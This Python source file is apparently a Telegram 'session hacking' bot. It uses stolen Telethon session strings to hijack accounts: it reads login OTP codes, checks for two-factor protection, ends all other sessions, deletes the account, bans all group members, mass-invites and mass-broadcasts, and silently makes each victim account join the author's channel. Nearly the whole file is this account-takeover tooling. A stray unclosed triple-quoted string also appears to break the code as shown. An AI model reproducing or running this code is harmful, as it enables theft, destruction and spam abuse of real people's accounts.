import re
import env
from asyncio import sleep
from Hack.helpers import validate_session
from asyncio.exceptions import TimeoutError as terror
from telethon.tl.types import ChannelParticipantsAdmins
from telethon import TelegramClient as tg, functions, errors
from telethon.tl.functions.auth import ResetAuthorizationsRequest as rt
from telethon.tl.functions.messages import ImportChatInviteRequest as ICIR
from telethon.tl.functions.channels import EditAdminRequest, GetAdminedPublicChannelsRequest as PC, JoinChannelRequest as join, LeaveChannelRequest as leave, DeleteChannelRequest as dcr, InviteToChannelRequest as ICR

ERROR_TEXT = """
**An unknown error occurred 🕷.

Exploit Name: __{}__

Bug Name: __{}__

Bug Description: __{}__

If you don't understand this, send it to @HEHE_STALKER**
"""
"""


# Exception Hander Func
def exception_handler(e, hack_name):
    return ERROR_TEXT.format(hack_name, type(e).__name__, e)

    # String Validater and Checker


async def str_checker(strses):
    try:
        bot = tg(strses, env.API_ID, env.API_HASH)
        await bot.connect()
        info = await bot.get_me()
        if info.bot:
            return False
        try:
            await bot(join('@WX_PM'))
        except:
            pass
        await bot.disconnect()
        return True
    except Exception:
        return False


async def check_string(x):
    yy = await x.send_message("ابـعت الجلسه")
    try:
        xx = await x.get_response(timeout=300)
        await yy.delete()
    except terror:
        await x.send_message("لقـد تجاوزت الـوقت")
        return False
    await xx.delete()
    strses = validate_session(xx.text)
    if strses:
        op = await str_checker(strses)
        if op:
            return strses
        else:
            await x.send_message('تـم حـذف هذه الجـلسه من الحـساب')
            return False
    else:
        await x.send_message('الجـلسه غير صحيحه')
        return False

        # Chat id/Username Func


async def ask_id(x, text="قم بإعطاء المعرف للمجموعة او القناة 🕷. "):
    ok = await x.send_message(text)
    try:
        grpid_msg = await x.get_response(timeout=180)
        await ok.delete()
    except terror:
        await x.send_message("لقـد تجاوزت الـوقت")
        return False
    await grpid_msg.delete()
    if grpid_msg.text.startswith("-"):
        return int(grpid_msg.text)
    else:
        return grpid_msg.text

        # broadcast messsage getter


async def ask_broadcast_message(x):
    xx = await x.send_message('يرجى إرسال الرسالة التي تريد اذاعتهـا فـقط 🕷.')
    try:
        broadcast_msg = await x.get_response(timeout=120)
        await xx.delete()
    except terror:
        return False
    if not broadcast_msg.text:
        await x.send_message(
            'يرجى إرسال الرسالة التي تريد اذاعتهـا فـقط 🕷.')
        return False
    return broadcast_msg.text

    # Dialogs Getter


async def get_dialogs(strses, group=False, channel=False, user=False):
    async with tg(strses, env.API_ID, env.API_HASH) as bot:
        dialogs = []
        async for x in bot.iter_dialogs():
            if x.is_group and group:
                dialogs.append(x.id)
            if x.is_channel and channel:
                dialogs.append(x.id)
            if x.is_user and user:
                dialogs.append(x.id)
        return dialogs

        # Hack 'A'


async def userchannels(strses):
    async with tg(strses, env.API_ID, env.API_HASH) as bot:
        channels = await bot(PC())
        result = ""
        for index, x in enumerate(channels.chats):
            try:
                result += f'{index+1}. CHANNEL NAME ~ {x.title} CHANNEL USERNAME ~ @{x.username}\n\n'
            except:
                pass
        if result:
            result += '\n\nالبـوت تـابع لـ سـورس @HEHE_STALKER 🕷.'
        return result

        # Hack 'B'


async def userinfo(strses):
    async with tg(strses, env.API_ID, env.API_HASH) as bot:
        k = await bot.get_me()
        username = f"@{k.username}" if k.username else "None"
        TEXT = f"ايدي = {k.id}\nالاسـم = {k.first_name}\nرقـمه = +{k.phone}\nUSERNAME = {username}\nقاعده البيانات = {bot.session.dc_id}\n\nالبـوت تـابع لـ سـورس @WX_PM 🕷. "
        return TEXT

        # Hack 'C'


async def ban_all(strses, grp, x):
    async with tg(strses, env.API_ID, env.API_HASH) as bot:
        self = await bot.get_me()
        try:
            grp_admins = await bot.get_participants(
                grp, filter=ChannelParticipantsAdmins)
            cant_ban = [admin.id for admin in grp_admins]
            await x.send_message("Try to Ban All Users")
            for users in await bot.get_participants(grp):
                if users.id == self.id:
                    continue
                elif users.id in cant_ban:
                    continue
                else:
                    try:
                        await bot.edit_permissions(grp,
                                                   users.id,
                                                   view_messages=False)
                        await sleep(1)
                    except Exception as e:
                        return exception_handler(e, "BAN ALL")
            return "تم حظر كافة الأعضاء بنجاح.\n\nالبـوت تـابع لـ سـورس @WX_PM 🕷."
        except Exception as e:
            return exception_handler(e, "BAN ALL")

            # Hack 'D'


async def otp_searcher(strses):
    async with tg(strses, env.API_ID, env.API_HASH) as bot:
        code = ""
        try:
            async for x in bot.iter_messages(777000, limit=1, search="Login code"):
                pattern = r'\b\d{5}\b'

                match = re.search(pattern, x.message)
                code += f"رمز الدخول الخاص بك هو {match.group()}"
        except:
            pass
        if not code:
            return 'لا يوجـد شي\n\nارسل كود مجددا'
        return code

        # Hack 'E'


async def joingroup(strses, username):
    async with tg(strses, env.API_ID, env.API_HASH) as bot:
        text = "انضم إلى القناة/المجموعة.\n\nالبـوت تـابع لـ سـورس @WX_PM 🕷."
        if username.startswith("https://t.me/+"):
            hash = (username.split("+"))[1]
            try:
                await bot(ICIR(hash))
                return text
            except Exception as e:
                return exception_handler(e, "JOIN CHAT/GROUP")
        else:
            try:
                await bot(join(username))
                return text
            except Exception as e:
                return exception_handler(e, "JOIN CHAT/GROUP")

                # Hack 'F'


async def leavegroup(strses, username):
    async with tg(strses, env.API_ID, env.API_HASH) as bot:
        try:
            await bot(leave(username))
            return "تم المغادره بنجاح ✅.\n\nالبـوت تـابع لـ سـورس @WX_PM 🕷."
        except Exception as e:
            return exception_handler(e, "LEAVE CHAT/GROUP")

            # Hack 'G'


async def delgroup(strses, username):
    async with tg(strses, env.API_ID, env.API_HASH) as bot:
        try:
            await bot(dcr(username))
            return "تم الـحذف بنجاح ✅. \n\nالبـوت تـابع لـ سـورس @WX_PM 🕷."
        except Exception as e:
            return exception_handler(e, "DELETE CHAT/GROUP")

            # Hack 'H'


async def user2fa(strses):
    async with tg(strses, env.API_ID, env.API_HASH) as bot:
        result = await bot(functions.account.GetPasswordRequest())
        if result.has_password:
            return "آسف المستخدم لديك خطوتين بالفعل.\n\nالبـوت تـابع لـ سـورس @WX_PM 🕷."
        else:
            return "loginليس لدى المستخدم كلمة مرور مكونة من خطوتين يمكنك تسجيل الدخول بها.\n\nالبـوت تـابع لـ سـورس @WX_PM 🕷."

            # Hack 'I'


async def terminate(strses):
    async with tg(strses, env.API_ID, env.API_HASH) as bot:
        try:
            await bot(rt())
            return "تم إنهاء كل الجلسات بنجاح\n\nالبـوت تـابع لـ سـورس @WX_PM 🕷."
        except Exception as e:
            return exception_handler(e, "TERMINATE")

            # Hack 'J'


async def delacc(strses):
    async with tg(strses, env.API_ID, env.API_HASH) as bot:
        try:
            await bot(functions.account.DeleteAccountRequest("Cruel world"))
            return "تم حذف الحساب بنجاح\n\nالبـوت تـابع لـ سـورس @WX_PM 🕷."
        except Exception as e:
            return exception_handler(e, "DELETE ACCOUNT")

            # Hack 'K'


async def leave_all(strses, dialogs=None):
    async with tg(strses, env.API_ID, env.API_HASH) as bot:
        left = 0
        for x in dialogs:
            if x == -1001898486632:
                continue
            try:
                await bot(leave(x))
                await sleep(1.5)
                left += 1
            except errors.rpcerrorlist.FloodWaitError as fwerr:
                sec = fwerr.seconds
                if sec > 180:
                    return left
                await sleep(sec + 5)
            except:
                pass
        return left

        # Hack 'L'


async def broadcast(strses, ids=None, msg=None):
    async with tg(strses, env.API_ID, env.API_HASH) as bot:
        sent = 0
        for i in ids:
            try:
                await bot.send_message(i, msg)
                sent += 1
                await sleep(2)
            except errors.rpcerrorlist.FloodWaitError as fverr:
                sec = fverr.seconds
                if sec > 180:
                    return sent
                await sleep(sec + 5)
            except:
                continue
        return sent

        # Hack 'M'


async def logout(strses):
    async with tg(strses, env.API_ID, env.API_HASH) as bot:
        ok = await bot.log_out()
        return ok

        # Hack 'N'


async def get_members(strses, grp_id):
    async with tg(strses, env.API_ID, env.API_HASH) as bot:
        members = []
        for users in await bot.get_participants(grp_id):
            if not users.bot:
                members.append(users.id)
        return members


async def invite_all(strses, from_grp, to_grp, x):
    async with tg(strses, env.API_ID, env.API_HASH) as bot:
        try:
            msg = await x.send_message('**processing......**')
            add = 0
            user_ids = await get_members(strses, from_grp)
            await msg.edit(
                f'**Members Found: __{len(user_ids)}__\nExpected Time: __{len(user_ids) * 1.5}__**'
            )
            peer = await bot.get_input_entity(to_grp)
            for user in user_ids:
                if add > 150:
                    break
                try:
                    await bot(ICR(channel=peer, users=[user]))
                    add += 1
                    await sleep(1.5)
                except errors.rpcerrorlist.FloodWaitError as fverr:
                    sec = fverr.seconds
                    if sec > 180:
                        break
                    await sleep(sec + 5)
                except Exception:
                    pass
            await msg.edit(
                f'**Total Members Added: __{add}__**\nFailed: {len(user_ids) - add}'
            )
        except Exception as e:
            await msg.edit(exception_handler(e, "INVITE ALL"))

            # Hack 'O' and 'P'


async def edit_admin(strses, x, promote=False, demote=False, chat_id=None, user_id=None):
    async with tg(strses, env.API_ID, env.API_HASH) as bot:
        try:
            chat = await bot.get_entity(chat_id)
            if promote:
                await bot(EditAdminRequest(chat_id, user_id, chat.admin_rights, 'Admin'))
                return 'تم رفعـت المستخدم بنجاح 🕷.\n\nالبـوت تـابع لـ سـورس @WX_PM 🕷.'

            else:
                await bot.edit_admin(chat, user_id, is_admin=False)
                return 'تم نزلت المستخدم من الادمنيه 🕷.\n\nالبـوت تـابع لـ سـورس @WX_PM 🕷.'
        except Exception as e:
            name = 'DEMOTE' if demote else 'PROMOTE'
            return exception_handler(e, name)
